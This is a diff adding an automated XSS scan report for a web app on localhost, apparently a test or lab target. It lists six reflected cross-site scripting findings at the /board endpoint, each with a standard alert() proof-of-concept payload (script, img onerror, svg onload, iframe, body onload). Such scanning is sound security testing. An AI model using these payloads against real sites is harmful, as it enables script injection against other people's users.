@@ -1,0 +1,39 @@
+
+============================================================
+XSS SCAN REPORT
+============================================================
+Scan Date: 2025-12-28 14:40:53
+Target: http://localhost:5000
+Total Vulnerabilities Found: 6
+============================================================
+
+1. [HIGH] Reflected XSS
+   Location: /board
+   Payload: <script>alert('XSS')</script>
+   Description: XSS payload reflected in board: <script>alert('XSS')</script>
+
+2. [HIGH] Reflected XSS
+   Location: /board
+   Payload: <img src=x onerror=alert('XSS')>
+   Description: XSS payload reflected in board: <img src=x onerror=alert('XSS')>
+
+3. [HIGH] Reflected XSS
+   Location: /board
+   Payload: <svg/onload=alert('XSS')>
+   Description: XSS payload reflected in board: <svg/onload=alert('XSS')>
+
+4. [HIGH] Reflected XSS
+   Location: /board
+   Payload: javascript:alert('XSS')
+   Description: XSS payload reflected in board: javascript:alert('XSS')
+
+5. [HIGH] Reflected XSS
+   Location: /board
+   Payload: <iframe src='javascript:alert("XSS")'></iframe>
+   Description: XSS payload reflected in board: <iframe src='javascript:alert("XSS")'></iframe>
+
+6. [HIGH] Reflected XSS
+   Location: /board
+   Payload: <body onload=alert('XSS')>
+   Description: XSS payload reflected in board: <body onload=alert('XSS')>
+
